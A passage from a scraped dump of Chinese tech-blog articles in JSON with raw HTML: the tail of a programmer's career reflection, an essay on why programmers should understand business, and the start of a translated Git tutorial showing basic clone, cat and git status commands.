函数输出一段字符呢？而且我们学习使用Console控制台的黑白屏输入输出，也不像是平时使用的软件啊？”。</p>\n<p>老师听后也是一脸的懵逼，说：“你好好学，慢慢就明白了”。</p>\n<p>你不懂的，老师也没法回答你，只有靠自己慢慢地摸索，慢慢去领悟。</p>\n<h2><strong>Java还是C#，平台选择的爱恨情仇</strong></h2>\n<p>初学Java，这是我接触的第一个最具有实用意义的编程语言（可以做网站，做软件，虽然C语言，C++也可以开发应用软件，但毕竟使用的人较少，对于初学者，找到一个合适的教程都困难）。当时的学习，基本是自学，上网下载视频教程，一集一集地看，不懂的概念上网查，去图书馆借阅相关书籍资料，什么JSP标签，Servlet，JDBC，到Struts MVC，Hibernate，Spring，设计模式，半年时间，算是初步入门，尽管对知识还是一知半解，但还是成功用Java做了毕业设计，做过几个小程序。</p>\n<p>工作之后，开始使用C#，算是与.NET平台结缘，一行一行地敲代码，一个接一个的做项目，一版又一版的升级软件，一晃9年了。从最初的ASP.NET WebForm，ADO.NET，到ASP.NET MVC，WebAPI，EntityFramework，面向服务架构的WCF，以及最新的跨平台.NET Core，微软为软件开发人员，提供了编程最大的便利性。</p>\n<p>仅从开发语言本身角度讲，C#并不比Java差，并且很多细微的地方，C#比Java做的要好，比如，C#中的get，set属性访问，要比Java的字段访问方便很多，相同逻辑代码运行效率方面，C#的MSIL比Java的字节码允许效率还要稍微高一些，但是无奈，.NET平台发展始终不及Java平台。诚然，平台的发展不能仅从开发语言本身考虑，平台运行环境，平台参与人员整体水平，使用成本等，更是起着决定性作用，.NET平台在互联网大潮中，逐渐被边缘化，免费的Java平台，被开源社区拥抱，成为互联网项目开发平台的中流砥柱。微软似乎意识到问题所在，逐步加入开源队伍，并提供了跨平台方案.Net Core，但并没有明显起色，.NET平台开发人员心中不免有一丝悲观情绪，.Net平台开发人员似乎比Java开发人员始终矮一头的感觉。</p>\n<h2><strong> 前端编程，JavaScript从无知到觉醒</strong></h2>\n<p>做Web开发，离不开HTML，CSS，JavaScript，尽管日常工作以后台开发为主，但接触的多了，慢慢地理解深入，从只会使用JS写函数，发展到使用JS面向对象的功能，理解了JS中闭包的概念（好烧脑，用离散数学中的概念来表示函数集合，让没学过集合概念的同学情何以堪）。明白了JS的面向对象编程，通过JS自定义前端控件，数据与逻辑代码分离，达到优雅地实现前端逻辑。学习的过程是曲折的，有时候一个概念始终理解不了，但一旦明白过来，会有一种眼前一亮，豁然开朗的感觉。起初一直不明白，为什么JQuery中的“$”这么牛，一个“$”符号能操作一切，读过JQuery源码之后才明白，这个“$”原来是jQuery在Window中定义的的一个变量，同时也是jQuery这个函数的别名，每次调用$(…)时，其实间接地创建了一个JQuery的示例。当然，这种操作得益于JS是一直动态语言，可以给对象任意添加属性和方法（相比较Java和C#是不能这样操作的）。</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fsb1rtwtcfj20hu05n74a.jpg\"></p>\n<h2>技术之路要不断学习，路漫漫其修远</h2>\n<p>技术更新迭代的速度，远超想象，往往是刚学会一个新技术，另一个更新的技术又变的火热，似乎新技术的产生，也在遵循一个摩尔定律。追赶技术的脚步，就如同夸父追日一般，你一直在追赶，但它一直在你前面。好在，每一个新技术，新架构的产生，都是在为更简单、更高效的解决现有的问题，所以，新的技术，虽然增加了学习的负担，但是新技术的应用，能够解决现实的问题，是效率的提升。从这个角度讲，学习是值得的。通常来说，没有谁天生就会做什么，只要肯学习，别人能做到的，你也能做到。</p>\n<p>React火热的时候，学习React，了解了这种基于模板的开发方式，见识了这种类似于MVC，实现数据与业务逻辑分离的编程方式在JS中的实际应用，对于这种仅需要一个render()函数的超简洁的框架赞叹不已。</p>\n<p>Facebook搞出了React，国人也不示弱，于是诞生了Vue，相对来说更简洁，使用更方便。</p>\n<p>React发展出了React Native，圈子里更是为止振奋，为火热的移动端开发又添了一把柴，让移动端开发，在Android和IOS原生开发之外，又多了一种全新的选择。</p>\n<p>我用3天时间，学会了开发微信小程序，完成了原有Web功能向小程序的移植。</p>\n<p>Node.JS火热的时候，我用了一周的业余时间，学习NodeJS编程，配合MongoDB，搭建了简单的日志系统。</p>\n<p>说起来有点吹牛的意思，但却是事实。</p>\n<p>一方面，不管是React，微信小程序，Node.JS，本质上都是JavaScript，Html，CSS的组合使用，相似度很高，只是各自有各自特点的规范特色而已，学习难度是逐渐降低的。</p>\n<p>另一方面，我相信大多数人也有感受，当工作经验，认知水平达到一定积累之后，学习其实是一件水到渠成的事情。</p>\n<h2>总结</h2>\n<p>有一次跟朋友聊天，朋友说，“感觉自己越学习，越感觉到不懂的方面更多了”。</p>\n<p>我笑笑，表示同意他的观点，这是一个叫做“知识边界”的问题，每个人的知识，就如同是一个圆，圆内是你已经了解的知识，圆之外就是还不懂的知识，一个人掌握的知识越多，这个圆也就越大，而圆越大，圆周所接触的那些未知领域也就越多。如果一个人说自己没有什么不懂的，那只能说明他知识面太小。如此，当我们意识到自己有很多不懂的东西的时候，也不用焦虑，因为我们的知识在扩展，保持一颗开放，学习的心，这是人生路上所必须的。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114124\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114124votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114124\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/eafe21f5bcf6519b0ad6dfff3f114ffef96d6a04.jpg"},{"url_object_id": "c8e1a285b335f2a803ddd35756a4148a", "title": ["为什么码农要了解业务？"], "url": "http://blog.jobbole.com/107275/", "create_date": "2018/06/12", "front_image_url": ["http://ww3.sinaimg.cn/mw690/7cc829d3gw1eizj4iuehrj20eq0b2gn2.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 3, "tags": "职场, 程序员", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.toutiao.com/i6563215390107763208/\">来自 jerryhuang650 推荐\r\n</a>   </div><div>\n<p> 最近一位分析界的老前辈对我很无奈地摇摇头，“这帮程序员，不食人间烟火哪！”我也深有感触，全世界的码农都一个样。</p>\n<p>这让我想起了，同样也是他，在多年之前，对我提了警醒——要重视业务。从那之后，我一直狂奔在技术+业务的双修道路上。</p>\n<p>放在以前，码农这个族群一定是稀罕动物。但在今天，这个世界最不缺的应该就是码农了，未来最廉价的也将是码农。仅有泛泛一技，在未来并不吃香，因为那是要被机器人所取代的。</p>\n<p>这个世界，缺的是技术过硬又精通业务的工程师，缺的是真正能解决实际业务问题的人，缺的是复合型的人才。</p>\n<p>码农不是工程师，码农只是会写代码，只会明确需求和逻辑的情况下写代码。工程师则不一样，懂得用技术怎么解决实际业务问题，用技术驱动业务的发展。</p>\n<p><img class=\"alignnone\" src=\"http://ww3.sinaimg.cn/mw690/7cc829d3gw1eizj4iuehrj20eq0b2gn2.jpg\" width=\"530\" height=\"398\"></p>\n<h1><strong>什么叫业务？</strong></h1>\n<p>先来明确这个问题。</p>\n<p>业务是一个很实在的东西，看得见感受得到，接地气儿。</p>\n<p>业务就是我们所能理解和感受的世界，就是这个世界或者某个行业的运转逻辑、流程与现状，是结果表象，是能够被看见和感受的，也是内在本质，是能够被洞察和感知的。</p>\n<p>业务就是这个世界发生了什么，什么时候，谁参与，怎么发生，结果如何。</p>\n<p>业务就是什么时候，谁在哪里，买了什么东西，花了多少钱，用什么支付。</p>\n<p>业务就是这个行业怎么发展起来的，现状如何，未来趋势如何，用了什么技术，有什么企业，商业模式如何，盈利能力如何，目前主要面临什么问题，消费者有什么特点，等等。</p>\n<p>世界很复杂，单个细分行业的业务也很复杂。</p>\n<h1><strong>为什么要了解业务？</strong></h1>\n<p>谈到这个，码农们一定有所不悦，“熟悉业务是需求分析师做的事，跟我们没有关系。”</p>\n<p>打个不恰当的比喻。有10个人经过一栋写字楼，突然从楼上掉下来几块砖头，砸中了9个人，其中就有7个码农，3个硕士，1个博士（原谅我又犯职业病，拿数据说话了）。而没被砸到的那个人，恰好因为了解到之前经常发生这样的事而绕道行走。</p>\n<p>如果你只会写代码，你不是不可替代的，而是可有可无的。因为这年头，会JAVA、C、Python的程序员，在大街上一抓一大把。现在已经开始提倡，编程从娃娃抓起了。10后都开始跟你抢饭碗了，你怕不怕？</p>\n<p>但话也不是那么极端，除非你的技术很牛逼，在国内或者某个行业内能够排上号的。但技术牛逼的人，也不是只是技术超群，还常常因为能够利用手中的技术解决某方面的业务问题，做了哪些突出的贡献。我们出来混，也是要拿成果说话的，做过什么项目，有什么价值。这种价值往往就是针对业务而说的。</p>\n<p>IT研发与业务需求方常常是一对冤家，常常因为一个业务功能实现争辩得耳红面赤。研发觉得这个功能很low，没什么技术含量，业务方却认为这个功能却很有用，需要花功夫做细做深做好。现实情况是，功能做出来了，却很难用，或者经常用不了，或者数据不对。研发想做点高大上的功能，业务方却认为太虚了，没什么用。（IT与业务方那点事就不多说了，大家都心知肚明~~）</p>\n<p>多年经验反复告诫我，鉴定一个功能是不是好功能，唯一的标准是看它能否支撑业务、改善业务、推动业务，也即应用效果。一个产品，只要有30%的功能，让业务用户用起来很爽，感觉帮助很大，就已经是一个不错的产品了。</p>\n<p>我们都认同，技术驱动业务。但我们不一定明白，正是由于业务的某些强烈需求，才推动技术的发展与落地。</p>\n<p>说这些，我是想说，作为技术人员，我们既要仰望星空，也要脚踏实地，既要追逐腾飞的技术，也要重视落地的业务。</p>\n<p>如果一个业务人员很懂技术，那将很可能是技术人员的灾难。因为那样的话，业务人员会很强势，又或者那样就没有技术人员什么事了。</p>\n<p>当然，也不难想象，一个真正懂看数据的测试人员，就好比一个真正懂用算法的业务人员一样难得。</p>\n<h1><strong>业务与数据的关系</strong></h1>\n<p>真实（而不是杜撰、模拟、伪造）、可量化、可被记录的数据一定会反映真实世界某方面的业务情形。而现实当中很多业务场景都可由数据体现出来。</p>\n<p>零售是业务场景最繁多且最贴近我们生活的行业，可以从中找到很多方便理解的例子。</p>\n<p>当你在一个酷热难耐的夏天上午10点，走进位于公司附近的全家便利店，使用微信支付，花了3.5元，买了一瓶无糖330ml摩登罐的可乐，而且刷会员卡攒了100积分，而收银员MM返回给了你一张POS单据，这时你所发生的这一切都已经通过收银记录在了全家的数据库里。更糟糕的是，店里的摄像头也已经把你在店里的一举一动录了下来了，转化成为一帧帧图像数据。</p>\n<p>这就是，业务数据化。</p>\n<p>店长通过数据分析发现，最近3.5元330ml摩登罐可乐的销量比上月增长了20%，而消费者中75%是20-35岁的男性，相比之下，300ml塑料瓶装的可乐销量却下滑40%。店长权衡比较了一下，300ml塑料瓶装可乐利润低，330ml摩登罐可乐目前更受年轻人欢迎，考虑到日渐增长的租金压力，做了一个大胆的决定——下架300ml塑料瓶装可乐，增加330ml摩登罐可乐的商品。（又拿数据说话了。）</p>\n<p>这就是，数据业务化。</p>\n<p>或者，数据驱动业务。</p>\n<p>当我开始接触一个行业时，我通常会花2-3周的时间去了解这个行业的业务，然后就大致清楚这个行业有什么样的数据，可以做哪方面的分析，解决什么问题。</p>\n<p>当遇到不好理解的分析结果时，我经常使用业务联想法，设身处地去体会结果所反映的业务场景是什么样的。</p>\n<h1><strong>如何了解业务？</strong></h1>\n<p>这个说大了，就是如何看这个世界。每个人有每个人的方法论，每个人有每个人的世界观，每个人有每个人的逻辑思维。</p>\n<p>我们都知道，观念的转变是最难的，也有很多不确定性。有些人可能因为自己的切身体会一天就改变了之前几十年根深蒂固的看法，有些人任由三姑六婆苦口婆心地劝说就是不肯改变自己的择偶观，却有可能因为自己年岁渐大不断降低自己的标准。</p>\n<p>但最好也及早要形成科学的思考方法，帮助正确地理解这个世界。</p>\n<p>以“面-线-点”的方式可以较为全面、系统、深入地了解一个行业，然后是某个垂直领域，最后再到具体业务场景。</p>\n<p>佛系文化的流行，使得年轻一代降低对这个世界的关注度，一切都无所谓，一切都漠不关心。</p>\n<p>这个世界从来没有变好过，但我们每个人都是这个世界的匆匆过客，都是行走在自己的人生路上不断领略这个世界的美与丑。这世间的风景，这世间的悲欢离合，如果我们积极地探索与领悟，也不枉来这世间走一遭。</p>\n<p>保持好奇心，可以驱动我们的思考，强化我们的认知，丰富我们的内在。</p>\n<p>这是我想说的第二个方面。</p>\n<p>怀有好奇心，就会渐渐地敏锐观察这个世界，多问自己一些为什么。</p>\n<p>我家附近原来有个沃尔玛超市，现在地产商将它装修一番，引入了不少餐厅，刚开张不久，我就去那里吃饭，吃的是烤鸭，一个多两个月后，再去那里吃饭，发现有一半的餐厅已经关门了。</p>\n<p>在去地铁站的那条路上，每天人流如梭，一点点，即使到了深夜，依然有很多人在门口排队买奶茶。然而，仅仅隔了一个店铺的喜茶，做不下去，关门了。两三个月前又换成粉店，路转粉。每天下班路过时，发现店里顾客不到10个，门可罗雀。</p>\n<p>为什么每家一点点奶茶店门口，不管是什么时候都是很多人，他们是托儿还是真的顾客？</p>\n<p>因为喜欢新鲜，不喜欢在冰箱里存太多菜，且附近没有菜市场，所以常去买菜的还是附近的钱大妈。但我却没怎么去更近的一家生活超市，店面比较大，除果肉蔬菜外，也卖油盐酱醋，还有生活用品，但奇怪的是顾客却不到钱大妈的1/10。</p>\n<p>为什么几乎所有潮州牛肉店都很多人，有很多甚至在门口排了很长的队？</p>\n<p>观察到这些，常常会陷入思考，为什么会发生这些，新零售到底改变了什么？</p>\n<p>再举个例子。</p>\n<p>去年拿保温杯泡着枸杞的中年男火了。</p>\n<p>关于这个，我又问了自己几个问题：拿着保温杯泡着枸杞的是不是都是中年男？如果是，这个特征能否被数据量化？可否考虑加入到算法模型当中，加以应用起来？</p>\n<p>虽然很多问题，我没有找到答案，但多问自己问题，会引发自己不断深入思考，不断激发自己好奇心，不断去研究。</p>\n<p>很多业务知识都是零散的，不可能在短时间内完全了解，可以在日常不断积累。</p>\n<p>关于日常积累业务知识，可以经常询问懂业务的人。这是我想说的第三个方面。</p>\n<p>刚进公司的时候，我以为业务很简单。很快，我就发现里面的坑不少。加上所在团队的成员也是刚入职不久的，问问题没处可问。过了一个月之后，我发现隔壁团队有两个十年左右的老员工，业务很熟，而且人特好。于是，我几乎一遇到业务问题，就跑过去“骚扰”他们，他们也很乐意解答，如果他们不清楚，他们也会告诉我应该去找谁了解。大约半年之后，我基本摸透了顺丰的数据和业务情况。我也和那两位老员工建立了不错的友谊，即使后来换了部门，我也经常过去找他们。</p>\n<p>跟懂业务的人搞好关系，遇到业务问题，多咨询他们，这是最有效最接地气的办法。</p>\n<p>多看书，这是我想说的第四个方面。</p>\n<p>比如说，从事新零售领域方面的工作，总得先了解新零售是怎么回事。你可以去听专家们忽悠，但这样的机会很少，而且时间也有限，说不定成本还很高。</p>\n<p>读书则不一样。读书，意味着主动了解，主动去构建自己的知识体系。</p>\n<p>读书的重要性，这里不多言了。</p>\n<p>如果您读这篇文章的时候，您恰好也是一位数据人。我还想告诫一句：我们不能脱离业务去看数据，而是要时刻从业务角度去理解数据。</p>\n<p>我们不敢期望可以完全理解这个世界，但也憧憬着我们不单可以在代码的世界里畅快驰骋，论剑江湖，也可以放下身段洞察芸芸众生之百态，领悟人间世俗之真情。</p>\n<p>如果真的可以的话，就没有需求分析师什么事了。</p>\n<div></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"107275\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"107275votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"107275\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/3c9d695ba504fed7faa5375f3c80ff7f2ff90de4.jpg"},{"url_object_id": "2fd3e1a536854e3343b73dcb02097713", "title": ["在 Git 中怎样克隆、修改、添加和删除文件？"], "url": "http://blog.jobbole.com/114104/", "create_date": "2018/06/09", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/a9f8e32251fe9ed8030a42ac78ef2343.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 2, "tags": "IT技术, Git, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/2/how-clone-modify-add-delete-git-files\">Kedar Vijay Kulkarni</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9517-1.html\">Linux中国/MjSeven</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a9f8e32251fe9ed8030a42ac78ef2343.jpg\"></p>\n<p>在 <a href=\"http://blog.jobbole.com/114101/\">本系列的第一篇文章</a> 开始使用 Git 时，我们创建了一个简单的 Git 仓库，并用我们的计算机连接到它，向其中添加一个文件。在本文中，我们将学习一些关于 Git 的其他内容，即如何克隆（下载）、修改、添加和删除 Git 仓库中的文件。</p>\n<h3 id=\"toc_1\">让我们来克隆一下</h3>\n<p>假设你在 GitHub 上已经有一个 Git 仓库，并且想从它那里获取你的文件——也许你在你的计算机上丢失了本地副本，或者你正在另一台计算机上工作，但是想访问仓库中的文件，你该怎么办？从 GitHub 下载你的文件？没错！在 Git 术语中我们称之为“克隆clone”。（你也可以将仓库作为 ZIP 文件下载，但我们将在本文中探讨克隆方式。）</p>\n<p>让我们克隆在上一篇文章中创建的名为 Demo 的仓库。（如果你还没有创建 Demo 仓库，请跳回到<a href=\"http://blog.jobbole.com/114101/\">那篇文章</a>并在继续之前执行那些步骤）要克隆文件，只需打开浏览器并导航到 <code>https://github.com/&lt;your_username&gt;/Demo</code> (其中 &lt;your_username&gt; <code></code> 是你仓库的名称。例如，我的仓库是 <code>https://github.com/kedark3/Demo</code>)。一旦你导航到该 URL，点击“克隆或下载Clone or download”按钮，你的浏览器看起来应该是这样的：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/c73c351075b2d57e2d8d9b59bc36ac5b.png\" alt=\"\"></p>\n<p>正如你在上面看到的，“使用 HTTPS 克隆Clone with HTTPS”选项已打开。从该下拉框中复制你的仓库地址（<code>https://github.com/&lt;your_username&gt;/Demo.git</code>），打开终端并输入以下命令将 GitHub 仓库克隆到你的计算机：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a602703795739\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit clone https://github.com/&lt;your_username&gt;/Demo.git\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a602703795739-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a602703795739-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a602703795739-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/&lt;your_username&gt;/Demo.git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a602703795739-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>然后，要查看 <code>Demo</code> 目录中的文件列表，请输入以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a60b646516425\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nls Demo/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a60b646516425-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a60b646516425-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a60b646516425-1\"><span class=\"crayon-e\">ls </span><span class=\"crayon-v\">Demo</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a60b646516425-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>终端看起来应该是这样的：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/bbaf1d51a27e653b3ff50bc5b5fd4034.png\" alt=\"\"></p>\n<h3 id=\"toc_2\">修改文件</h3>\n<p>现在我们已经克隆了仓库，让我们修改文件并在 GitHub 上更新它们。首先，逐个输入下面的命令，将目录更改为 <code>Demo/</code>，检查 <code>README.md</code> 中的内容，添加新的（附加的）内容到 <code>README.md</code>，然后使用 <code>git status</code> 检查状态:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a60f099457229\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd Demo/\r\nls\r\ncat README.md\r\necho \"Added another line to REAMD.md\" &gt;&gt; README.md\r\ncat README.md\r\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a60f099457229-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a60f099457229-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a60f099457229-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a60f099457229-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a60f099457229-5\">5</div><div class=\"crayon-num crayon-striped-num\" 